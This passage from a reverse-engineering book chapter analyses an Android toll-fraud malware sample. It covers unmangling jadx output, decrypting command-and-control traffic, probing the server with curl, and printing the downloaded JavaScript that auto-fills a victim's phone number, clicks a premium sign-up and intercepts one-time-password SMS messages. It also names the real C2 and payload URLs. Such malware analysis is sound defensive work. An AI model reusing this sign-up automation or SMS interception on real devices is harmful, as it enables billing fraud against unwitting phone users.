<p class="indent">Renaming mangled names doesn’t just make code easier to understand. The practice also helps you keep track of code you’ve already analyzed. When you see an unmangled name, you don’t have to worry about whether you’ve seen it before; you’ll be able to recognize the human-readable name more easily, even if it’s something like <em>unknown_string</em> or <em>not_sure</em>. Rename mangled names liberally, even if you don’t quite understand yet what a name is for.</p>&#13;
<p class="indent">While unmangling names, we also recommend that you introduce some structure to them. Although the style is shunned in software development nowadays, we’ve found <em>Hungarian notation</em>, a naming convention in which a variable’s type information is included in its name, to be extremely useful for this purpose. For example, you might name an integer <code>iLen</code>, a string <code>strName</code>, and so on. You can even use this naming scheme for unmangling method names, for example by using <code>getStrName</code> for a simple getter function that returns a string we call <code>name</code>.</p>&#13;
<p class="indent">Finally, name unmangling can reduce visual load. Try renaming long names to short names, and names with numbers or Unicode characters to simple names consisting of ASCII characters only. For each name mangling technique you encounter, consider why it was introduced and then use your tool’s renaming function to counter the effect. Developers of name mangling techniques think it’s smart to use only random Unicode characters, shorten all names to single characters, or even change the text direction so names are read from top to bottom instead of left to right. However, for reverse engineers, all of these techniques make it extremely easy to spot the difference between mangled names and names that have already been unmangled. It’s much more confusing for reverse engineers if all names are random English-language nouns, or, as we’ve seen in real malware, if <span epub:type="pagebreak" id="page_99"/>the names come from the code’s original source but have been randomly swapped so that the malware uses, for example, <code>int socket</code> and <code>Socket i</code> instead of <code>int i</code> and <code>Socket socket</code>.</p>&#13;
<p class="indent">Armed with these name unmangling concepts, let’s take a stab at unmangling a sample of the third-stage code. <a href="ch03.xhtml#ch3lis21">Listing 3-21</a> shows the original code, with the mangled names intact.</p>&#13;
<pre>public static void xn3o(android.content.Context p14) {&#13;
  android.util.Log.e(vgy7.vgy7.vgy7.vgy7.vgy7.bhu8, p14.getPackageName());&#13;
  android.content.Context v5_0 = p14.getApplicationContext();&#13;
  if (vgy7.vgy7.vgy7.vgy7.bhu8.qaz1 == null) {&#13;
    String v0_12;&#13;
    vgy7.vgy7.vgy7.vgy7.bhu8.qaz1 = vgy7.vgy7.vgy7.vgy7.vgy7.wsx2;&#13;
    vgy7.vgy7.vgy7.vgy7.bhu8.vgy7 = v5_0.getSharedPreferences("bshwai", 0);&#13;
    vgy7.vgy7.vgy7.vgy7.bhu8.vgy7();&#13;
    vgy7.vgy7.vgy7.vgy7.bhu8.bhu8 =&#13;
      vgy7.vgy7.vgy7.vgy7.bhu8.vgy7.getInt("bshwai", 0);&#13;
    vgy7.vgy7.vgy7.vgy7.bhu8.mko0 =&#13;
      vgy7.vgy7.vgy7.vgy7.bhu8.vgy7.getString("tffhhk", 0);&#13;
    android.telephony.TelephonyManager v0_11 = &#13;
      ((android.telephony.TelephonyManager)v5_0.getSystemService("phone"));&#13;
    if (v0_11 != null) {&#13;
      v0_12 = v0_11.getSimOperator();&#13;
      if (android.text.TextUtils.isEmpty(v0_12)) {&#13;
        v0_12 = "";&#13;
      }&#13;
    }&#13;
    vgy7.vgy7.vgy7.vgy7.bhu8.cft6 = v0_12;</pre>&#13;
<p class="list" id="ch3lis21"><em>Listing 3-21: The original mangled code, as produced by jadx</em></p>&#13;
<p class="indent">Let’s clean this up by removing lengthy package names to reduce visual overload, supplying meaningful names, using Hungarian notation to provide easily accessible type information, and marking code that doesn’t do anything as <em>noOp</em> (no operation). The unmangled version, shown in <a href="ch03.xhtml#ch3lis22">Listing 3-22</a>, is much easier to understand.</p>&#13;
<pre>public static void xn3o(android.content.Context context) {&#13;
  android.util.Log.e(Constants.strDrizzt, context.getPackageName());&#13;
  android.content.Context context = context.getApplicationContext();&#13;
  if (Utils.urlUtansy == null) {&#13;
    String strSimOperator;&#13;
    Utils.urlUtansy = Constants.urlUtansy;&#13;
    Utils.prefBshwai = context.getSharedPreferences("bshwai", 0);&#13;
    Utils.noOp();&#13;
    Utils.intSettingBhswai = Utils.prefBshwai.getInt("bshwai", 0);&#13;
    Utils.strSettingTffhhk = Utils.prefBshwai.getString("tffhhk", 0);&#13;
    android.telephony.TelephonyManager telephonyManager = &#13;
      ((android.telephony.TelephonyManager)context.getSystemService("phone"));&#13;
    <span epub:type="pagebreak" id="page_100"/>if (telephonyManager != null) {&#13;
      strSimOperator = telephonyManager.getSimOperator();&#13;
      if (android.text.TextUtils.isEmpty(strSimOperator)) {&#13;
        strSimOperator = "";&#13;
      }&#13;
    }&#13;
    Utils.strSimOperator = strSimOperator;</pre>&#13;
<p class="list" id="ch3lis22"><em>Listing 3-22: Code cleaned up with jadx’s renaming function</em></p>&#13;
<p class="indent">We still don’t know what the preferences in <code>bshwai</code> and <code>tffhhk</code> are, or what the URL <code>urlUtansy</code> is used for, but at least we can read the transformed code relatively fluently. Note also that we’ve given two different variables the same name, <code>context</code>. That would be a big no-no in programming, as compilers don’t allow two variables in the same scope to have the same name. In reverse engineering, however, this is perfectly fine, and perhaps even encouraged. For example, renaming every uninteresting name to an underscore (<code>_</code>) can significantly reduce cognitive load.</p>&#13;
<h3 class="h3" id="ch03lev9"><strong>Command-and-Control Server Communication</strong></h3>&#13;
<p class="noindent">In this section, we will showcase pieces of <em>xn3o</em> to explain how the fraudulent app works. Execution of this third stage is dynamic, with a command-and-control server telling the malware what to do and in what order. To follow along, you must understand how the malware communicates with the server.</p>&#13;
<p class="indent">You’ll notice that we’re no longer in the realm of pure static analysis. At this point, sticking with a static approach alone is too limiting. To understand how malware communicates with its command-and-control servers, it’s usually easier to just run the malware and intercept the traffic. However, to keep this chapter focused on static analysis, we’ll punt our explanation of dynamic analysis tools to the next chapter and concentrate instead on the information we can glean from the code.</p>&#13;
<p class="indent">As you’ll see, this app performs direct carrier billing fraud, or toll fraud, by signing users up for premium services without their knowledge or against their will. Some toll fraud functions as a pure social engineering scam, showing the users phishing-like sign-up pages and hoping that they will complete the registration process themselves. The toll fraud shown here, however, uses a second common technique: simulating user actions with Android and JavaScript APIs and signing up for premium services without the user noticing. Despite all of this automation, the malware performs just a few key steps:</p>&#13;
<ul>&#13;
<li class="noindent">Load a referral website that forwards to the premium service.</li>&#13;
<li class="noindent">Use code to automatically engage with the premium service page and subscribe the user without their consent.</li>&#13;
<li class="noindent"><span epub:type="pagebreak" id="page_101"/>Intercept and extract the one-time password sent over SMS.</li>&#13;
<li class="noindent">Paste the one-time password into the premium service page to complete registration.</li></ul>&#13;
<p class="indent">Most toll fraud apps use roughly the same framework. Armed with this knowledge, we can now revisit the malware’s third stage and look into how it achieves all of these steps.</p>&#13;
<h4 class="h4" id="ch03lev1sec24"><strong><em>Examining the Encryption Algorithm</em></strong></h4>&#13;
<p class="noindent">All communication with the command-and-control server is encrypted using a simple algorithm found in the <code>vgy7.vgy7.vgy7.vgy7.bhu8</code> class. Recall that we discovered this <code>vgy7</code> method in <a href="ch03.xhtml#ch3lis20">Listing 3-20</a>. Shown in <a href="ch03.xhtml#ch3lis23">Listing 3-23</a>, it takes two arguments. The second argument controls whether the string passed as the first argument is encrypted (<code>z = true</code>) or decrypted (<code>z = false</code>).</p>&#13;
<pre>public static String vgy7(String str, boolean z) {&#13;
  int i = 0;&#13;
  if (z) {&#13;
    Random random = new Random();&#13;
    char[] charArray = str.toCharArray();&#13;
    StringBuilder sb = new StringBuilder();&#13;
    char charAt = "abcdefghijklmnopqrstuvmxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(&#13;
      random.nextInt(13));&#13;
    char charAt2 = "abcdefghijklmnopqrstuvmxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(&#13;
      random.nextInt(13) + 13);&#13;
    int i2 = (charAt2 - charAt) + 5;&#13;
    sb.append(charAt2);&#13;
    sb.append(charAt);&#13;
    char charAt3 = "abcdefghijklmnopqrstuvmxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(&#13;
      random.nextInt(52));&#13;
    while (i &lt; charArray.length) {&#13;
      if (i % i2 == 0) {&#13;
        sb.append(charAt3);&#13;
      }&#13;
      sb.append(charArray[i]);&#13;
      i++;&#13;
    }&#13;
    return sb.toString();&#13;
  }&#13;
  int charAt4 = (str.charAt(0) - str.charAt(1)) + 5;&#13;
  char[] charArray2 = str.substring(2).toCharArray();&#13;
  StringBuilder sb2 = new StringBuilder();&#13;
  while (i &lt; charArray2.length) {&#13;
    if (i % (charAt4 + 1) != 0) {&#13;
      sb2.append(charArray2[i]);&#13;
    }&#13;
    i++;&#13;
  <span epub:type="pagebreak" id="page_102"/>}&#13;
  return sb2.toString();&#13;
}</pre>&#13;
<p class="list" id="ch3lis23"><em>Listing 3-23: The <span class="codeitalic1">vgy7</span> method can encrypt and decrypt communications with the command-and-control server.</em></p>&#13;
<p class="indent">The encryption algorithm is clearly homegrown and very weak. To encrypt a string, it first picks a random lowercase letter and a random uppercase letter. It subtracts the ASCII code of the second letter from that of the first and adds five. The encrypted output string starts with the two random letters, followed by the letters of the input string to encrypt. At string locations where the result of the subtraction plus five equals zero, the algorithm inserts a random character that doesn’t have any meaning. For example, the third character of the encrypted string (in other words, the zeroth character of the transformed input string) is always a random character, as zero modulo any value is always zero.</p>&#13;
<h4 class="h4" id="ch03lev1sec25"><strong><em>Probing the Server from the Command Line</em></strong></h4>&#13;
<p class="noindent">Now that we know how encryption and decryption works, we can write a small script to interact with the malware’s command-and-control server and probe its commands and responses. As the encryption and decryption routine is self-contained in just one method, we’ve pasted the code from jadx into two files, <em>Encrypt.java</em> and <em>Decrypt.java</em>, that can be run from the command line. Here, we use the Linux command line to interact with the malware’s server:</p>&#13;
<pre>$<span class="codestrong1"> echo -n '{"josiwo": "com.bp.statis.bloodsugar", "worikt": "20610",&#13;
    "zubfih": "1646292590992_", "qredyb": 30, "kdthit": 6 }' |&#13;
  xargs -0 java Encrypt |&#13;
  curl https://www.utansy.com/xn3o/in -s -d @- |&#13;
  xargs java Decrypt</span></pre>&#13;
<p class="indent">This command encodes a JSON argument with values collected by the app (and explained later in this section), echoes the command to our <em>Encrypt</em> script while stripping the newline with the <code>-n</code> flag, pipes the encrypted payload to cURL in silent (<code>-s</code>) and POST (<code>-d</code>) modes, and decrypts the command received from the server. The output will look something like this: <code>"bshwai": 5320786, "xjnguw": ""</code>.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>As command-and-control servers are usually short-lived, we don’t expect this command-and-control server to be around for experimentation when you’re reading this book. Unfortunately, this will limit your ability to follow along with dynamic analysis.</em></p>&#13;
</div>&#13;
<h4 class="h4" id="ch03lev1sec26"><strong><em>Registering with the Server</em></strong></h4>&#13;
<p class="noindent">Now that we can send encrypted payloads to the server and decrypt its responses, we can begin to understand how the malware communicates with it. Here, we’ll show the information being sent between the malware and its <span epub:type="pagebreak" id="page_103"/>command-and-control server by simulating the malware running on a real device connected to the mobile network of Belgian carrier Orange. As the malware uses the value of the <code>worikt</code> field in command-and-control communication to identify the phone’s mobile carrier, changing this value to identifiers of other mobile carriers allows us to easily experiment with different mobile carriers in different countries.</p>&#13;
<p class="indent">The first connection the malware makes to its command-and-control server is to register with the server. It sends registration information to <em>https://www.utansy.com/xn3o/in</em> using encrypted JSON. The server responds with an encrypted JSON object that the malware decrypts and processes.</p>&#13;
<p class="indent">In all instances of encrypted JSON communication, the malware developers replaced the meaningful names of the JSON fields with gibberish names to throw off analysis. You can see what this looks like in <a href="ch03.xhtml#ch3lis24">Listing 3-24</a>, which shows the decrypted JSON object sent to the command-and-control server in the registration phase.</p>&#13;
<pre>{&#13;
  "josiwo": "com.bp.statis.bloodsugar",&#13;
  "worikt": "20610",&#13;
  "zubfih": "1646292590992_",&#13;
  "qredyb": 30,&#13;
  "kdthit": 6&#13;
}</pre>&#13;
<p class="list" id="ch3lis24"><em>Listing 3-24: The decrypted payload of the registration message</em></p>&#13;
<p class="indent">To understand these gibberish names, it helps to approach the problem from two sides. When you see gibberish JSON fields referred to in the code, document the values they are assigned. Then do the same thing when you see gibberish JSON fields in decrypted communication. We can guess the meaning of some fields, like <code>josiwo</code>, from their assigned values. The meaning of others, like <code>kdthit</code>, must be found through code inspection.</p>&#13;
<p class="indent">Luckily, the malware doesn’t try to hide the gibberish strings in the code or reuse the same gibberish names in different contexts. For example, searching jadx for <code>josiwo</code> returns only one location, shown in <a href="ch03.xhtml#ch3lis25">Listing 3-25</a>. This code contains the exact same field names as the decrypted JSON object in <a href="ch03.xhtml#ch3lis24">Listing 3-24</a>. We can safely assume that the code is responsible for assigning the values of these gibberish fields.</p>&#13;
<pre>org.json.JSONObject v1_3 = new org.json.JSONObject();&#13;
try {&#13;
  v1_3.put("josiwo", v0_2.getPackageName());&#13;
} catch (java.io.IOException v0) {&#13;
  v0_3 = 0;&#13;
} catch (org.json.JSONException v0) {&#13;
}&#13;
v1_3.put("worikt", bhu8.cft6);&#13;
v1_3.put("zubfih", bhu8.xdr5);&#13;
v1_3.put("qredyb", android.os.Build$VERSION.SDK_INT);&#13;
<span epub:type="pagebreak" id="page_104"/>v1_3.put("kdthit", 6);&#13;
nji9.nji9 v1_7 = new nji9.bhu8(0).vgy7.bhu8.vgy7("xn3o/in").toString(),&#13;
  bhu8.vgy7(v1_3.toString().getBytes()));</pre>&#13;
<p class="list" id="ch3lis25"><em>Listing 3-25: Building up the JSON payload of the registration message</em></p>&#13;
<p class="indent">With this extra context, we can see that <code>josiwo</code> is clearly the malware app’s own package name and <code>qredyb</code> is the device’s SDK build level. The string <code>kdthit</code> is always the number 6, but its meaning is unclear. Maybe it’s a version code to help the client and server negotiate a communication protocol.</p>&#13;
<p class="indent">The meaning of <code>worikt</code> and <code>zubfih</code> are not immediately obvious, but following the code to the assignment of the two variables makes it possible to understand them: <code>worikt</code> is the device’s SIM operator code, as returned by <code>TelephonyManager.getSimOperator</code> (the 20610 code is for the provider Orange Belgium). The value of <code>zubfih</code> is more complex. Depending on the device’s API level, the value is either set to the Unix timestamp of the app’s install time or the device’s Android ID.</p>&#13;
<h4 class="h4" id="ch03lev1sec27"><strong><em>Processing the Registration Response</em></strong></h4>&#13;
<p class="noindent">After a successful registration request, the command-and-control server responds with a string that decrypts to the JSON object shown in <a href="ch03.xhtml#ch3lis26">Listing 3-26</a>.</p>&#13;
<pre>{&#13;
  "bshwai": 4904276,&#13;
  "xjnguw": ""&#13;
}</pre>&#13;
<p class="list" id="ch3lis26"><em>Listing 3-26: Response from the command-and-control server for a new client registration</em></p>&#13;
<p class="indent">The exact meaning of the return value of <code>bshwai</code> is unclear, but it could be an ID assigned to the client. Using cURL to probe the command-and-control server returns the same value for <code>bshwai</code> until a new timestamp value is sent in the <code>zubfih</code> request field. It’s likely that the server uses the installation timestamp to distinguish between infected clients and assigns new client IDs on that basis. As the client IDs seem to increment linearly, it’s also possible to use this value to estimate the number of infected devices and how fast new devices are infected.</p>&#13;
<p class="indent">The second return value, <code>xjnguw</code>, is also very interesting. In our tests, it was nearly always empty. It seems to depend on the app’s package name, because the server returned a non-empty value when we switched the package name parameter in <code>josiwo</code> to, for example, <em>com.takela.message</em>, the package name of another malware sample in the same family. Returned non-empty values look like <em>1_1487372418053478</em>, where the 1 (or sometimes 2) before the underscore is a version identifier for a fourth stage to download and the part after the underscore is a Facebook app ID used to initialize the Facebook SDK bundled in this fourth stage. The fourth stage is downloaded from <em>https://xn3o.oss-accelerate.aliyuncs.com/fbhx1</em> or <span epub:type="pagebreak" id="page_105"/><em>https://xn3o.oss-accelerate.aliyuncs.com/fbhx2</em>, depending on the version code. At the end of this chapter, we’ll take a look at these plug-ins.</p>&#13;
<h4 class="h4" id="ch03lev1sec28"><strong><em>Downloading Commands</em></strong></h4>&#13;
<p class="noindent">After registering with the command-and-control server, the malware connects to <em>https://www.utansy.com/xn3o/ti</em> to retrieve commands to execute. These commands are used to connect to an affiliate website that forwards to a payment sign-up page. Once the page is loaded, the downloaded commands start to interact with it and sign the user up without their consent. Users will be billed on their next phone bill, and the affiliate that led to the sign-up is paid a reward.</p>&#13;
<p class="indent">The request payload sent to the command URL contains information collected by the malware about the state of the device. <a href="ch03.xhtml#ch3lis27">Listing 3-27</a> shows an example request.</p>&#13;
<pre>{&#13;
  "zubfih": "1646292590992_",&#13;
  "bshwai": 4904276,&#13;
  "eymbmw": true,&#13;
  "tffhhk":&#13;
  {&#13;
    "rktfht": false,&#13;
    "segdip": false,&#13;
    "elbcnf": "+3214137764",&#13;
    "dgebpf":&#13;
    [&#13;
      "sp@porst.tv",&#13;
      "@LambdaCube"&#13;
    ]&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch3lis27"><em>Listing 3-27: Payload sent to the command-and-control server to request commands</em></p>&#13;
<p class="indent">The <code>eymbmw</code> field indicates whether the device is on a mobile network or not (devices need a mobile connection to sign up for many carrier billing sites). The <code>rktfht</code> field indicates whether the app has permission to receive incoming SMS messages or access app notifications, which the app needs in order to retrieve the one-time password for the billing sign-up process. The <code>segdip</code> field indicates whether the app has permission to send SMS messages, which is necessary to confirm the billing sign-up on some pages. The <code>elbcnf</code> field contains the device’s phone number, and <code>dgebpf</code> contains a list of all accounts registered with the device. Depending on the device, registered accounts can be someone’s email address, WhatsApp number, X account handle, or LinkedIn profile ID. It is unclear why the malware collects this information. Also included are the values <code>zubfih</code> and <code>bshwai</code> seen in the registration request.</p>&#13;
<h4 class="h4" id="ch03lev1sec29"><span epub:type="pagebreak" id="page_106"/><strong><em>Processing the Command-and-Control Server’s Response</em></strong></h4>&#13;
<p class="noindent">Interpreting the response received from the command URL is difficult, but <a href="ch03.xhtml#ch3lis28">Listing 3-28</a> shows the two most obvious fields.</p>&#13;
<pre>{&#13;
  "lybfta":&#13;
  [&#13;
    {&#13;
      "ejqgpk": 42698996,&#13;
      "gooycf": "https://d624x9ov.com/dVZjL5Vo?campaign=10372&#13;
                 &amp;sub_aff=42698996&amp;sub_aff3=EZ",&#13;
      "inbzrz": 200,&#13;
      "hyszxc": false,&#13;
      "eymbmw": false,&#13;
      "gkreil":&#13;
      [&#13;
        {&#13;
          "ejqgpk": 7198,&#13;
          "xjnguw": 100,&#13;
          "jxdkqb": "try{window.JBridge.call('log','v1');&#13;
          var phone_input=document.querySelector('#phone-input');&#13;
          var phone_submit=document.querySelector('#phone-continue-button');&#13;
          if(phone_input!=null&amp;&amp;phone_input.offsetHeight&gt;0){&#13;
            window.JBridge.call('log','  phone');&#13;
            phone_input.value='0'+'214137764';&#13;
            window.JBridge.call('log','214137764');&#13;
            var event=document.createEvent('HTMLEvents');&#13;
            event.initEvent('input',true,true);&#13;
            phone_input.dispatchEvent(event);&#13;
            phone_submit.click();&#13;
            nextThings();&#13;
            ...&#13;
          }",&#13;
          "gooycf": "https?://s.premium-be-ex.digi-place.com/\\?q.*"&#13;
        }&#13;
      ]&#13;
    }&#13;
  ],&#13;
  "jxdkqb":&#13;
  {}&#13;
}</pre>&#13;
<p class="list" id="ch3lis28"><em>Listing 3-28: The response contains JavaScript code to navigate through sign-up pages.</em></p>&#13;
<p class="indent">The <code>gooycf</code> field contains the affiliate URL to be loaded in the next step of the fraud. The <code>jxdkqb</code> field contains a list of JavaScript instructions. These use a JavaScript bridge object injected into the premium sign-up website and <span epub:type="pagebreak" id="page_107"/>allow the malicious JavaScript code to interact with the malicious Java code in <em>xn3o</em>.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>In the original JSON response from the server, this JavaScript code is found on a single line. We have formatted it here to make it more readable. We’ve also abbreviated it, as it is very long.</em></p>&#13;
</div>&#13;
<h4 class="h4" id="ch03lev1sec30"><strong><em>Secretly Signing Up for the Premium Service</em></strong></h4>&#13;
<p class="noindent">After the affiliate URL and the JavaScript commands have been downloaded, the malware opens the affiliate URL in a customized WebView. The WebView’s customizations all involve intercepting loaded websites and manipulating them, partly to circumvent anti-bot protections on the sign-up page and partly to interact with the sign-up page to simulate a legitimate user.</p>&#13;
<p class="indent">In a mobile web browser, opening the affiliate URL shown in the command response payload redirects to the site shown in <a href="ch03.xhtml#ch3fig3">Figure 3-3</a>.</p>&#13;
<div class="image"><img id="ch3fig3" src="../images/ch03fig03.jpg" alt="Image" width="270" height="470"/></div>&#13;
<p class="figcap"><em>Figure 3-3:  Belgian premium service sign-up page</em></p>&#13;
<p class="indent">This is the first stage of the premium service subscription process, where the user enters their phone number. In small text at the bottom, the cost of this service is disclosed to be six euros per week, and there are instructions for unsubscribing.</p>&#13;
<h4 class="h4" id="ch03lev1sec31"><strong><em>Setting Up the JavaScript Bridge</em></strong></h4>&#13;
<p class="noindent">After the sign-up page has loaded, the malware starts to interact with it through a <em>JavaScript interface</em>, a standard Android API in which an app can <span epub:type="pagebreak" id="page_108"/>create a bridge between it and a website in a WebView object. A simple jadx search for the Android API <code>addJavascriptInterface</code> shows where this happens in <em>xn3o</em> (<a href="ch03.xhtml#ch3lis29">Listing 3-29</a>).</p>&#13;
<pre>public vgy7(Context context, vgy7.vgy7.vgy7.vgy7.mko0.vgy7 vgy7Var) {&#13;
  this.f10vgy7 = new nji9(context);&#13;
  ...&#13;
  WebSettings settings = this.f10vgy7.getSettings();&#13;
  settings.setJavaScriptEnabled(true);&#13;
  settings.setCacheMode(2);&#13;
  settings.setMixedContentMode(0);&#13;
  settings.setDomStorageEnabled(true);&#13;
  settings.setUserAgentString(vgy7.vgy7.vgy7.vgy7.bhu8.zse4);&#13;
  settings.setJavaScriptCanOpenWindowsAutomatically(true);&#13;
  ...&#13;
  this.f10vgy7.addJavascriptInterface(&#13;
    new zse4(), vgy7.vgy7.vgy7.vgy7.vgy7.rfv4);&#13;
  this.f10vgy7.setWebChromeClient(new mko0());&#13;
  this.f10vgy7.setWebViewClient(new cft6());&#13;
}</pre>&#13;
<p class="list" id="ch3lis29"><em>Listing 3-29: Setting up the JavaScript interface to manipulate the sign-up page</em></p>&#13;
<p class="indent">The first argument passed to <code>addJavascriptInterface</code> is a Java object that is made accessible from websites loaded into the WebView. The second argument is the name that the object should be given in JavaScript. JavaScript code can use this name to refer to the object and call methods defined in the object. In case of the malware, the name is simply <code>JBridge</code>.</p>&#13;
<p class="indent">The Java class <code>zse4</code>, which defines the JavaScript bridge object, has only one method marked with the <code>@JavascriptInterface</code> decorator, the <code>call</code> method. Only methods marked with this decorator are accessible from JavaScript, so this is the only method the JavaScript part of the malware can invoke. Inside the <code>call</code> method is a long chain of <code>if...else</code> statements, which in malware often indicates a piece of code that interprets commands. Finding malware’s command interpreter is a jackpot for reverse engineers, as it lets them see which commands are backed by what code. This helps reverse engineers quickly understand large parts of malicious functionality.</p>&#13;
<p class="indent">Based on the arguments to <code>call</code>, we can already see that the first argument is the command name and the second argument is the command options. The long <code>if...else</code> chain checks the command name and invokes different code based on the command to execute. A slice of that functionality is shown in <a href="ch03.xhtml#ch3lis30">Listing 3-30</a>.</p>&#13;
<pre>if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.yhn6)) {&#13;
  vgy7.this.vgy7(Integer.parseInt(str2), 0);&#13;
} else if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.tgb5)) {&#13;
  vgy7.this.vgy7(302, Integer.parseInt(str2));&#13;
} else if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.qwe1)) {&#13;
  vgy7.vgy7.vgy7.vgy7.bhu8.nji9(str2);&#13;
<span epub:type="pagebreak" id="page_109"/>} else if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.ujm7)) {&#13;
  vgy7.this.vgy7(302, 80014);&#13;
  return vgy7.this.bhu8.bhu8(str2, 60007);</pre>&#13;
<p class="list" id="ch3lis30"><em>Listing 3-30: Processing JavaScript commands in the <span class="codeitalic1">zse4</span> class</em></p>&#13;
<p class="indent">In this code, the <code>str</code> argument is compared to string values <code>finish</code>, <code>schedule</code>, <code>textTo</code>, and <code>popMsg</code>, respectively. Following the methods called from inside the <code>if</code> clauses reveals the code that backs these commands.</p>&#13;
<h4 class="h4" id="ch03lev1sec32"><strong><em>Interacting with the Java Bridge Object</em></strong></h4>&#13;
<p class="noindent">Now that you understand the Java implementation of the JavaScript bridge object, take a closer look at the downloaded JavaScript commands, shown in <a href="ch03.xhtml#ch3lis31">Listing 3-31</a>.</p>&#13;
<pre>try {&#13;
  window.JBridge.call('log', 'v1');&#13;
  var phone_input = document.querySelector('#phone-input');&#13;
  var phone_submit = document.querySelector('#phone-continue-button');&#13;
  if (phone_input != null &amp;&amp; phone_input.offsetHeight &gt; 0) {&#13;
    window.JBridge.call('log', '  phone');&#13;
    phone_input.value = '0' + '214137764';&#13;
    window.JBridge.call('log', '214137764');&#13;
    var event = document.createEvent('HTMLEvents');&#13;
    event.initEvent('input', true, true);&#13;
    phone_input.dispatchEvent(event);&#13;
    phone_submit.click();&#13;
    nextThings();&#13;
  } else {&#13;
    window.JBridge.call('log', 'no phone input');&#13;
    window.JBridge.call('finish', '306');&#13;
  }&#13;
} catch (e) {&#13;
  window.JBridge.call('log', 'click error:' + e);&#13;
  window.JBridge.call('finish', '304');&#13;
}</pre>&#13;
<p class="list" id="ch3lis31"><em>Listing 3-31: JavaScript code is used to subscribe to the premium service.</em></p>&#13;
<p class="indent">First, the code tries to find the phone number input field on the subscription site using the <code>querySelector</code> method. Once it has discovered this, the code inputs the device’s phone number into the field, uses JavaScript to click the subscription button, and calls the method <code>nextThings</code>.</p>&#13;
<p class="indent"><a href="ch03.xhtml#ch3lis32">Listing 3-32</a> shows an excerpt of the code from <code>nextThings</code>, where many lines invoke the <code>call</code> method of the bridge object. As the bridge object is defined by the Java class <code>zse4</code>, we can easily follow what these lines do. Analysis of <code>zse4</code> confirms that the command names are true to their meaning: the JavaScript code tries to intercept an incoming SMS (<code>popMsg</code>) and send a <span epub:type="pagebreak" id="page_110"/>confirmation SMS to the number 9956 to complete the registration process (<code>textTo</code>).</p>&#13;
<pre>var numm = '9956';&#13;
var kkey = 'OK';&#13;
var sms1 = numm + '---' + kkey;&#13;
var sms11 = '+' + numm + '---' + kkey;&#13;
window.JBridge.call('log', 'sms1:' + sms1);&#13;
var andupin = window.JBridge.call('popMsg', '1::(\\\\d{3,6})');&#13;
if (andupin == '9956') {&#13;
  window.JBridge.call('textTo', sms11);&#13;
  window.JBridge.call('textTo', sms1);&#13;
  window.JBridge.call('log', 'sms1');&#13;
  window.JBridge.call('finish', '100');&#13;
} else {&#13;
  window.JBridge.call('textTo', sms11);&#13;
  window.JBridge.call('textTo', sms1);&#13;
  window.JBridge.call('log', 'nopinsms1');&#13;
  window.JBridge.call('finish', '305');&#13;
}</pre>&#13;
<p class="list" id="ch3lis32"><em>Listing 3-32: The payload connects Java and JavaScript code through JavaScript interface <span class="codeitalic1">JBridge</span>.</em></p>&#13;
<p class="indent">One mystery remains: how are the JavaScript commands actually executed in the context of the subscription website? There’s a standard Android API for that: <code>WebView.evaluateJavascript</code>, which allows an app to inject any JavaScript code into a website.</p>&#13;
<h4 class="h4" id="ch03lev1sec33"><strong><em>Completing the Sign-up Process</em></strong></h4>&#13;
<p class="noindent">At a different code location, the list <code>vgy7Var.yhn6</code> is read and the intercepted SMS messages and notifications are processed. A quick reference check in jadx shows that the only place in the code where the list is read is in the <code>bhu8</code> method.</p>&#13;
<p class="indent">This method, shown in <a href="ch03.xhtml#ch3lis33">Listing 3-33</a>, takes a string argument of the form <code>number::string</code>, which it splits at the double colon (<code>::</code>). The first part of this argument is used as a regular expression to parse the SMS. The second part contains the regular expression capture group number where the one-time password is expected. The method also takes an integer argument used to sleep the current thread if the expected SMS can’t be found. It likely does this to wait for the SMS to arrive and then check for it again.</p>&#13;
<pre>public String bhu8(String str, int i) {&#13;
  String remove;&#13;
  for (int i2 = 0; i2 &lt; 107; i2++) {&#13;
    if (this.yhn6.size() &gt; 0 &amp;&amp; (remove = this.yhn6.remove(0)) != null) {&#13;
      String[] split = str.split("::");&#13;
      Matcher matcher = Pattern.compile(split[1]).matcher(remove);&#13;
      <span epub:type="pagebreak" id="page_111"/>if (matcher.find()) {&#13;
        return matcher.group(Integer.parseInt(split[0]));&#13;
      }&#13;
    }&#13;
    try {&#13;
      Thread.sleep(i / 107);&#13;
    } catch (InterruptedException e) {&#13;
    }&#13;
  }&#13;
  return "";&#13;
}</pre>&#13;
<p class="list" id="ch3lis33"><em>Listing 3-33: Parsing for the one-time password</em></p>&#13;
<p class="indent">The <code>bhu8</code> method is called from two places in <em>xn3o</em>: once with a hardcoded string argument built to parse SMS messages from certain Thai subscription sites and once from the command handler for the <code>popMsg</code> command. For the Belgian subscription site, the malware uses the second option. We now know that the JavaScript code shown in <a href="ch03.xhtml#ch3lis34">Listing 3-34</a> and previously downloaded from the command-and-control server is a simple extractor for a number with three to six digits.</p>&#13;
<pre>var andupin = window.JBridge.call('popMsg', '1::(\\\\d{3,6})');}</pre>&#13;
<p class="list" id="ch3lis34"><em>Listing 3-34: Parsing the one-time password for the Belgian sign-up page</em></p>&#13;
<p class="indent">What happens after the call to the <code>popMsg</code> method is noteworthy. <a href="ch03.xhtml#ch3lis32">Listing 3-32</a> showed that, no matter the number extracted from the SMS, the app continues the sign-up process by sending the message <em>ok</em> to the phone number 9956. While we don’t have access to a real Belgian phone to observe the complete sign-up process, we can assume that this premium service doesn’t use one-time passwords at all. Maybe users can confirm their subscription by simply texting <em>ok</em> to the service’s premium number.</p>&#13;
<h3 class="h3" id="ch03lev10"><strong>The Mysterious Fourth Stage</strong></h3>&#13;
<p class="noindent">Before we wrap up this chapter, let’s have a quick look at the mysterious fourth stage that the malware seems to rarely use. Downloading the previously mentioned <em>fbhx1</em> and <em>fbhx2</em> files and loading them in jadx shows that they each have just a single package name: <em>com.facebook.*</em> or <em>com.facebook2.*</em>.</p>&#13;
